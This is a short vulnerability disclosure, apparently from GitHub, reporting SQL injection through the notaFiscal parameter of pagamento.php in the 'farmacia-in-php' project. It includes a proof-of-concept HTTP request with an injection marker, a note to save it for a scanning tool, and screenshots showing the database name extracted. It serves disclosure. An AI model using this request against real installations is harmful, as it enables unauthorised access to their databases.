# farmacia-in-php has sql injection in pagamento.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
pagamento.php and notaFiscal parameter.

## describe
There are unrestricted sql injection attacks and injection attacks in the farmacia-in-php. The controllable parameters are as follows: notaFiscal parameter. This function will execute the notaFiscal parameter without restriction into the sql statement.

**Code analysis**    

The pagamento.php notaFiscal parameter value is obtained, concatenated into the SQL statement and executed without restrictions, and a malicious attacker can obtain sensitive server information through this SQL injection vulnerability

![image-20241127110114368](https://github.com/user-attachments/assets/7d4618ba-60cd-4e4e-9c76-601b0fa1c1e2)

## POC

```
GET /pagamento.php/cupon-fiscal.php?notaFiscal=1* HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=ecmd5kmr6te8fpgjnri7c4up85
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

save as  1.txt

**Result**

injection parameter: notaFiscal

![image-20241127105908402](https://github.com/user-attachments/assets/3b991acf-2867-45a2-9196-662beed97f3c)

Get databases: farmacia

![image-20241127110033174](https://github.com/user-attachments/assets/ffee6a20-999b-44f0-9aa4-c0b3f51cbea4)
